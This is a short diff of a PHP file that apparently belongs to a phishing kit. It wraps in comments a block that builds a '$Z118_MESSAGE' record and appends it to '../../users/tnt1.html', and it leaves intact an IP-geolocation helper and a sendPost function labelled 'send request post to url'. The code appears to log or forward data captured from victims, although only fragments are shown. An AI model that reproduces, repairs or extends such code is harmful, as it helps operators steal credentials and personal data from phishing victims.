@@ -77,7 +77,7 @@ function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) {
 //
 
 //
-
+/*
 $Z118_MESSAGE .= "
 
 <pre style='border: 2px solid; border-color: rgb(67, 159, 253);border-radius: 4px;font-weight: bold;font-size: 14px;padding-top: 1.5%;padding-bottom: 2%;'>
@@ -103,7 +103,7 @@ $f = fopen("../../users/tnt1.html", "a");
 
 
 fclose($f);
-
+*/
 
 //----------------send request post to url ----------------
 function sendPost($url,$data) {
